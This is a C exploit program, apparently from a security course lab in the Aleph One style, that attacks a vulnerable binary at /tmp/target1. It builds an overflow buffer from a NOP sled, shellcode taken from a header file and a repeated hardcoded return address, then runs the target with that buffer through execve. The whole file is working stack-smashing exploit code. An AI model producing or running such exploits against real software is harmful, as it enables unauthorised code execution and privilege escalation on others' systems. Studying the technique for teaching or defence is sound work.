#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target1"

#define DEFAULT_OFFSET	100
#define DEFAULT_BUFFER_SIZE 740
#define NOP  0x90

// can't copy paste shellcode here

int main(void)
{
  char *args[3];
  char *env[1];

  // code mainly from Aleph One’s
  char *buff, *ptr;
  long *addr_ptr, addr;
  int offset = DEFAULT_OFFSET, bsize = DEFAULT_BUFFER_SIZE;
  int i;
  

  if( !(buff = malloc(bsize))) {
    printf( "Can't allocate memory. \n");
    exit(0);
  }

  
  addr = 0xbffff8e0;
  printf( "Using address: 0x%x\n", addr );
  
  ptr = buff;
  addr_ptr = (long *) ptr;
  for ( i = 0; i < bsize; i += 4 )
	 *(addr_ptr++) = addr;

  for ( i = 0; i < bsize / 2; i++ )
	 buff[i] = NOP;
  
  ptr = buff + ((bsize/2) - (strlen(shellcode)/2));
  
  for( i = 0; i < strlen(shellcode); i++ )
    *(ptr++) = shellcode[i];
 
 
  buff[bsize - 1] = '\0';
  

  args[0] = TARGET; args[1] = buff; args[2] = NULL;
  env[0] = NULL;
  
  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
